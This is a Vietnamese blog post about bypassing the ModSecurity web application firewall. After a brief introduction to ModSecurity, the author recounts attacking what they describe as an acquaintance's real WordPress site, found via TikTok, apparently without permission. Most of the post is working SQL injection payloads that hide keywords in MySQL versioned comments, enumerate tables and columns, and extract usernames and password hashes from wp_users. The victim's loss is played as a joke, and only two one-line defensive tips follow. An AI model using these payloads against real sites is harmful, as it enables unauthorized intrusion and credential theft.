# Đôi chút về Mod Security
[Mod Security](https://en.wikipedia.org/wiki/ModSecurity) à một module tường lửa có thể tích hợp với các [Web Application Server](https://en.wikipedia.org/wiki/Application_server) (máy chủ ứng dụng web) như Apache, IIS, Nginx cho phép phân tích và ghi nhật ký các luồng dữ liệu HTTP/S.Với sự đóng góp từ dự án [ModSecurity Core Rule Set](https://owasp.org/www-project-modsecurity-core-rule-set/) của tổ chức OWASP đã giúp ModSecurity trở nên mạnh mẽ và linh động hơn trong việc phân tích các hành vi có nguy cơ xâm hại an ninh ứng dụng web.

Mod Security đứng trước Web Server, làm nhiệm vụ như một firewall để kiểm soát truy cập vào ra Web Server. Các thông tin đi từ bên ngoài vào và bên trong ra sẽ được kiểm soát chặt chẽ để tránh những thông tin có thể gây hại cho Web Server hay là việc rò rỉ các thông tin đặc biệt từ Web Server đến Client.
> **Bạn có thể xem thêm tại:** [Tích hợp "Mod Security" cho Web Application Server để chống lại SQL Injection và tấn công XSS](https://viblo.asia/p/tich-hop-mod-security-cho-web-application-server-de-chong-lai-sql-injection-va-tan-cong-xss-bJzKmx6X59N) - Phan Van Tung
# Chuyển cảnh qua chủ đề chính
Trong bài viết này, mình cho bạn thấy cách mà mình vượt qua rào cản của Mod Security khi vô tình lướt được **video Tiktok giới thiệu trang web của ông anh 96** (*Nhân vật tăng sự hấp dẫn*).
Khi lưới qua trang web, tôi vô tình nhận ra rằng trang của **ông anh 96** gặp phải lỗi đơn giản:
```
site/ejemplo?parameter=-1+union+selec+1,2,3,4,5,6,7+--+
```
![](https://images.viblo.asia/3428da26-ad3f-4976-95f3-c31bf7a8fac2.PNG)
Chỉ bằng cách mã hóa các parameter bằng **/*...*/** mình có thể vượt qua bộ lọc WAF.
```
site/ejemplo?parameter=-1+/*!50000union*/+/*!50000selec*/+1,2,3,4,5,6,7+--+
```
![](https://images.viblo.asia/170ccd05-604a-4314-89d2-3d714946dd8c.PNG)
Ở đây, bạn có thể thấy cột dễ tấn công chính là cột thứ 4. Nhưng với người ham tò mò như mình, mình quyết định thử inject với cách khác.
```
AND mod(29,9)+div+@a:=(concat(database(),"--","_Y000!_"))+UNION+DISTINCTROW+SELECT+1,2,3,@a,5,6,7
```
Kết quả trả về khi mình không cần mã hóa:
![](https://images.viblo.asia/6fe8908c-1ccb-456a-be4b-dd594c882235.PNG)
Tiếp tục, mình áp dụng theo cách trước đó, mã hóa tiếp xem thế nào?
```
-1+AND+mod(29,9)+div+@a:=(/*!50000concat(database/**_**/(),"--","_Y000!_")*/)+/*!50000UNION*//**//*!50000DISTINCTROW*/+/*!50000SELECT*/+1,2,3,@a,"_Y000!_",6,7--+
```
![](https://images.viblo.asia/adc1b3f9-6817-4f31-800d-7016e77928d0.PNG)
Kết quả trả về đúng như mong đợi của mình, sau khi mã hóa và thực hiện chúng đã bỏ qua WAF Mod Security và trả về kết quả
![](https://images.viblo.asia/4d307383-fe97-4006-b396-38368b5c55ec.PNG)
Thiết nghĩ, có thể truy xuất dữ liệu từ database thì nghĩ tới ngay việc sử dụng `concat()` để truy xuất dữ liệu thông qua download xem thế nào?
```
@a:=(/*!50000concat(database/**_**/(),"--","_Y000!_")*/)
```
![](https://images.viblo.asia/f10c4d4a-e28d-4f35-a4a0-2221a1db5a11.PNG)
Bạn thấy chứ, tệp tải xuống là **5.html** trong khi cột số 4 dễ inject. Chính tỏ thì ngoài cột số 4 thì mình có thể inject qua cột số 5.

Tận dụng lỗi này, mình kiểm tra thêm đôi chút! Thực hiện truy xuất thông tin cơ bản từ tên của bảng database:
```
-1+AND+mod(29,9)+div+@a:=(/*!50000concat(database/**_**/(),"--","_Y000!_")*/)+/*!50000UNION*//**//*!50000DISTINCTROW*/+/*!50000SELECT*/+1,2,3,@a,table_name,6,7+/*!50000from*/+/*!50000information_schema.tables*/+--+
```
![](https://images.viblo.asia/a8212eba-529c-4b97-9099-d8842ab93d47.PNG)
Như bạn thấy, trước đó mình thực hiện với 1 tệp tải xuống, nhưng ở đây mình thực hiện với truy xuất bảng trên database. Mỗi bảng tương ứng với mỗi thẻ` <tr></tr>` và có thể truy xuất thông qua thẻ `<a></a>`.

Rõ hơn chút, mình đã thấy trang **ông anh 96** này sử dụng Wordpress 🤷‍
![](https://images.viblo.asia/88258031-240e-4426-879d-74eb4738fc9c.PNG)
Tiếp tục mình thực hiện truy xuất từ bảng **wp_users**.
```
-1+AND+mod(29,9)+div+@a:=(/*!50000concat(database/**_**/(),"--","_Y000!_")*/)+/*!50000UNION*//**//*!50000DISTINCTROW*/+/*!50000SELECT*/+1,2,3,@a,column_name,6,7+/*!50000from*/+/*!50000information_schema.columns*/+/*!50000where*/+/*!50000table_name="wp_users"*/+--+
```
![](https://images.viblo.asia/d86282cf-f371-473f-9b0d-a5a4b8de7b45.PNG)
Vậy là bạn có thể rằng, mình có thể truy xuất dữ liệu **username** và **password** rồi đấy 😁
```
-1+AND+mod(29,9)+div+@a:=(/*!50000concat(database/**_**/(),"--","_Y000!_")*/)+/*!50000UNION*//**//*!50000DISTINCTROW*/+/*!50000SELECT*/+1,2,3,@a,/*!50000CoNcAt(user_nicename,"--",user_pass)*/,6,7+/*!50000from*/+/*!50000wp_users*/+--+
```
![](https://images.viblo.asia/d03205a4-511e-4c59-b56c-f88751c3285b.PNG)
Kết cục của **ông anh 96** là **còn cái nịt** nhé 😜
# Mình nói nhỏ cho mà nghe
* Hãy đảm bảo rằng bạn đã hoàn toàn kiểm soát được đầu vào đầu ra, dù cho là nơi không tưởng nhất.
* Đừng giống như **ông anh 96** mà đem trang của mình lên Tiktok nhé 😜

Cảm ơn các bạn đã đọc bài viết của mình, đừng quên **Like** và **Share** ủng hộ mình 😘 Nếu cảm thấy hay thì hãy **Follow** để theo dõi các bài viết tiếp theo của mình nhé 💋